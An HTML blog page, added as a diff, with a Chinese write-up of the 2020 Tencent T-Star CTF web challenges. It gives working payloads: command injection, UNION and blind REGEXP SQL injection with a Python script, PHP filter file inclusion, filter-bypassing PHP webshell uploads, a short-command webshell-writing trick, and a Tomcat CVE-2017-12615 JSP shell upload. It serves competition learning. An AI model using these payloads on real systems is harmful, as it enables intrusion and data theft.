@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+<meta name="google-site-verification" content="fQ_tfBgNjE9NQcpKnGAkWapHoKuimF5lVuNuqpPXar0">
+    <meta charset="utf-8">
+    
+    <title>2020腾讯犀牛鸟网络安全T-Star高校挑战赛Writeup | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search" name='keys'>
+		</div>
+	</div>
+</form>
+
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="" target="_blank">友情链接</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.redmango.top/" target="_blank">HhhM</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://l1near.top/" target="_blank">L1nearのspace</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.mrskye.cn/" target="_blank">SkYe&#39;s Blog</a>
+				</li>
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.kawhi.xyz" target="_blank">kawhi</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+
+<div class="m-header" id="headers" >
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      2020腾讯犀牛鸟网络安全T-Star高校挑战赛Writeup
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><ul>
+<li>js过滤，直接抓包改后缀getflag即可</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200630150552.png" alt="微信图片_20200630150552"></p>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630150634.png" alt="微信截图_20200630150634"></p>
+<h2 id="命令执行基础"><a href="#命令执行基础" class="headerlink" title="命令执行基础"></a>命令执行基础</h2><ul>
+<li>直接管道符执行其他命令即可</li>
+</ul>
+<pre><code>baidu.com | cat  ../key.php</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630150908.png" alt="微信截图_20200630150908"></p>
+<h2 id="你能爆破吗"><a href="#你能爆破吗" class="headerlink" title="你能爆破吗"></a>你能爆破吗</h2><ul>
+<li><p>burpsuite爆破密码账号都是admin，登陆成功会set一个cookie，cookie是用户名的base64。</p>
+</li>
+<li><p>payload</p>
+</li>
+</ul>
+<pre><code>-admin&quot;union select 1,(select group_concat(flag) from flag),3-- </code></pre><ul>
+<li>base64</li>
+</ul>
+<pre><code>LWFkbWluInVuaW9uIHNlbGVjdCAxLChzZWxlY3QgZ3JvdXBfY29uY2F0KGZsYWcpIGZyb20gZmxhZyksMy0tIA==</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630151339.png" alt="微信截图_20200630151339"></p>
+<h2 id="文件包含GetShell"><a href="#文件包含GetShell" class="headerlink" title="文件包含GetShell"></a>文件包含GetShell</h2><ul>
+<li>右键看源码提示了<code>lfi.txt</code>拿到<code>lfi.php</code>的源码</li>
+</ul>
+<pre><code class="php">&lt;?php
+$file = $_REQUEST[&#39;file&#39;];
+if ($file != &#39;&#39;) {
+    $inc = sprintf(&quot;%s.php&quot;, $file); // only php file can be included
+    include($inc);
+}
+?&gt;</code></pre>
+<ul>
+<li>直接PHP伪协议去读flag.php源码即可。</li>
+</ul>
+<pre><code>file=php://filter/read=convert.base64-encode/resource=flag</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200630151723.png" alt="微信图片_20200630151723"></p>
+<ul>
+<li>base64解码得到flag:</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630151835.png" alt="微信截图_20200630151835"></p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul>
+<li>对&lt;?、php、eval等进行了过滤，过滤比较简单直接替换为空，直接双写就能绕过，eval直接利用php对大小写不敏感绕过。</li>
+<li>payload</li>
+</ul>
+<pre><code>&lt;php?&lt;?p&lt;?phphp EVAL($_GET[&#39;cmd&#39;]);?&gt;</code></pre><ul>
+<li>文件后缀fuzz发现pht能解析，所以最终解法，上传个图片然后插入上面的payload即可getshell.</li>
+</ul>
+<p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630152459.png" alt="微信截图_20200630152459"></p>
+<ul>
+<li><p>getflag</p>
+</li>
+<li><pre><code>http://1c74d0d4.yunyansec.com/upload/1593501867.pht?cmd=var_dump(file_get_contents(%27../../key%27));</code></pre><p><img src="http://goodcheerleung.gitee.io/blog/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630152629.png" alt="微信截图_20200630152629"></p>
+</li>
+</ul>
+<p>-</p>
+<h2 id="分析代码获得flag"><a href="#分析代码获得flag" class="headerlink" title="分析代码获得flag"></a>分析代码获得flag</h2><p>源码：</p>
+<pre><code class="php">&lt;?php
+show_source(__FILE__);
+error_reporting(0);
+if(strlen($_GET[1])&lt;7){
+     echo shell_exec($_GET[1]);
+}
+
+?&gt;</code></pre>
+<p>p神之前在小密圈发过一份奇淫技巧，里面就有这么一招，但这里限制了7字符，小密圈里面的是8字符，恰好</p>
+<p><code>ls -t&gt;x</code>长度不符合要求没办法用，这里可以用奇淫技巧里面换行的办法把<code>ls -t&gt;x</code>写到文件里面然后用sh执行。</p>
+<p>网上找的paylaod在ls -t之间少了一个空格没办法执行，尝试之后ls分开写，然后s加空格可以写到ls -t:</p>
+<pre><code>&gt;l\\
+&gt;s\ \\
+ls&gt;_
+&gt;\ \\
+&gt;-t\\
+&gt;\&gt;y
+ls&gt;&gt;_</code></pre><p>然后就可以愉快的写wenshell了：</p>
+<pre><code>&gt;hp
+&gt;1.p\\
+&gt;d\&gt;\\
+&gt;\ -\\
+&gt;e64\\
+&gt;bas\\
+&gt;7\|\\
+&gt;XSk\\
+&gt;Fsx\\
+&gt;dFV\\
+&gt;kX0\\
+&gt;bCg\\
+&gt;XZh\\
+&gt;AgZ\\
+&gt;waH\\
+&gt;PD9\\
+&gt;o\ \\
+&gt;ech\\
+sh _
+sh y</code></pre><p><img src="https://cdn.redmango.top/img/20200630151900.png" alt></p>
+<p>flag为上一级的key文件。</p>
+<p>flag{a1c8BFF2}</p>
+<h2 id="小猫咪踩灯泡"><a href="#小猫咪踩灯泡" class="headerlink" title="小猫咪踩灯泡"></a>小猫咪踩灯泡</h2><p>送分题，CVE-2017-12615</p>
+<p>抓个包，get改成put，路径改成一个不存在的jsp文件，后面加上斜杠就能把马儿传上去了。</p>
+<p><img src="https://cdn.redmango.top/img/20200630153429.png" alt></p>
+<p>传上去发现根目录有个flag.txt</p>
+<pre><code>http://06d6e62b.yunyansec.com/hhhm.jsp?&amp;pwd=023&amp;cmd=cat%20flag.txt</code></pre><p>flag{54e47be053bf6ea1}</p>
+<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><p>输入框输入</p>
+<pre><code class="python">0&#39; union select 1,2,3,database()--
+0&#39; union select 1,2,3,table_name from information_schema.tables where table_schema=&#39;web1&#39;#
+0&#39; union select 1,2,3,column_name from information_schema.columns where table_name=&#39;fl4g&#39;#
+0&#39; union select 1,2,3,flag from fl4g#</code></pre>
+<h2 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h2><p>最后20分钟发现是regexp注入，哭了一直在跑一直在手抖,一边祈求者时间慢点。最后一分钟内吧flag提交成功。</p>
+<ul>
+<li>在一次又一次测试中发现居然存在password这个字段。立马想起了BJDCTF的REGEXP注入。过滤了空格直接用/**/代替。</li>
+</ul>
+<p><img src="C:%5CUsers%5C51763%5CDesktop%5Cpic%5C%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20200630210453.png" alt="微信图片_20200630210453"></p>
+<ul>
+<li>最终exp</li>
+</ul>
+<pre><code class="php">import os
+import requests as req
+
+def ord2hex(string):
+  result = &#39;&#39;
+  for i in string:
+    result += hex(ord(i))
+  result = result.replace(&#39;0x&#39;,&#39;&#39;)
+  return &#39;0x&#39;+result
+
+
+string = [ord(i) for i in &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;]
+headers = {
+      &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0&#39;,
+      &#39;Accept&#39;:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,
+      &#39;Connection&#39;:&#39;keep-alive&#39;
+    }
+
+res = &#39;&#39;
+for i in range(50):
+  for j in string:
+      url = &quot;http://a330e61e.yunyansec.com/picture.php?id=-1\&quot;or&quot;
+      passwd = ord2hex(&#39;^&#39;+res+chr(j))
+      passwd = &#39;/**/password/**/regexp/**/binary/**/{}-- &#39;.format(passwd)
+      url = url+passwd
+      #print(url)
+      r = req.get(url, headers=headers)
+      if &quot;PNG&quot; in r.text:
+          res += chr(j)
+          print(res)
+          break</code></pre>
+<p><img src="C:%5CUsers%5C51763%5CDesktop%5Cpic%5C%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630211928.png" alt="微信截图_20200630211928"></p>
+<ul>
+<li>跑出密码,md5解密一下。</li>
+</ul>
+<pre><code>5832f4251cb6f43917df</code></pre><p><img src="C:%5CUsers%5C51763%5CDesktop%5Cpic%5C%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630211248.png" alt="微信截图_20200630211248"></p>
+<ul>
+<li>登陆后台拿到flag</li>
+</ul>
+<p><img src="C:%5CUsers%5C51763%5CDesktop%5Cpic%5C%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200630211512.png" alt="微信截图_20200630211512"></p>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2020-07-02T09:35:46.000Z" itemprop="datePublished">2020-07-02</time>
+	</div>
+</article>
+<!-- 目录内容 -->
+<div id='maktoc'>
+
+    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
+          <span class="btn-bg"></span>
+          <span class="btn-text">文章导航</span>
+          </p>
+    <div id="toc-article" class="toc-article">
+        <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
+        <strong class="toc-title">文章目录</strong>
+           <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#签到"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令执行基础"><span class="toc-number">2.</span> <span class="toc-text">命令执行基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#你能爆破吗"><span class="toc-number">3.</span> <span class="toc-text">你能爆破吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含GetShell"><span class="toc-number">4.</span> <span class="toc-text">文件包含GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件上传"><span class="toc-number">5.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析代码获得flag"><span class="toc-number">6.</span> <span class="toc-text">分析代码获得flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小猫咪踩灯泡"><span class="toc-number">7.</span> <span class="toc-text">小猫咪踩灯泡</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#成绩单"><span class="toc-number">8.</span> <span class="toc-text">成绩单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入2"><span class="toc-number">9.</span> <span class="toc-text">SQL注入2</span></a></li></ol>
+         </div>
+   <script type="text/javascript">
+    function showToc(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribrootute("style","display:block");
+        show_toc_btn.setAttribute("style","display:none");
+        };
+    function showBtn(){
+        var toc_article = document.getElementById("toc-article");
+        var show_toc_btn = document.getElementById("show-toc-btn");
+        toc_article.setAttribute("style","display:none");
+        show_toc_btn.setAttribute("style","display:block");
+        };
+	function getScrollTop() {
+	    var scroll_top = 0;
+	    if (document.documentElement && document.documentElement.scrollTop) {
+		scroll_top = document.documentElement.scrollTop;
+	    }
+	    else if (document.body) {
+		scroll_top = document.body.scrollTop;
+	    }
+	    return scroll_top;
+	};
+	var headers=document.getElementById("headers");
+	var tocs = document.getElementById("toc-article");
+	
+	
+	window.onscroll  = function(){
+	if(getScrollTop()>450){
+			if(tocs.offsetTop>100){
+			var tophight = tocs.offsetTop-15;
+			tocs.style.cssText="top:"+tophight+"px";
+			}
+	}else{
+			tocs.style.cssText="top:540px";
+		}
+				
+		
+		//console.log(getScrollTop());	
+		
+	}
+window.onresize = function(){
+	var mak_toc = document.getElementById("maktoc");
+	if($(window).width()<1414){
+	mak_toc.setAttribute("style","display:none");
+	}else{
+	mak_toc.setAttribute("style","display:block");
+	}
+}
+   </script>
+      
+<!-- 目录内容结束 -->
+</div>
+
+<!--评论-->
+
+	
+<div id="lv-container" data-id="city" data-uid="MTAyMC80OTc4Mi8yNjI3Mw==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>兵至如归-Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+							
+							<li>
+				        		<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">
+				        			
+				        				<i class="iconfont icon-weixin"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<footer class="footer" role="contentinfo">
+
+	<div class="wrapper wrapper--wide split split--responsive">
+<a href="http://beian.miit.gov.cn/">粤ICP备18132442号-1</a><br>
+<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=44011202000643" style="display:inline-block;text-decoration:none;height:20px;line-height:20px;"><img src="/gongan.png" style="float:left;"/><p style="float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;">粤公网安备 44011202000643号</p></a><br>
+
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="https://github.com/justpsvm">justpsvm</a>. Powered by <a href="https://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+ <script type="text/javascript"> /* 鼠标点击特效 - 7Core.CN */ var a_idx = 0;jQuery(document).ready(function($) {$("body").click(function(e) {var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");var $i = $("<span/>").text(a[a_idx]); a_idx = (a_idx + 1) % a.length;var x = e.pageX,y = e.pageY;$i.css({"z-index": 100000000,"top": y - 20,"left": x,"position": "absolute","font-weight": "bold","color": "#ff6651"});$("body").append($i);$i.animate({"top": y - 180,"opacity": 0},1500,function() {$i.remove();});});}); </script>
+
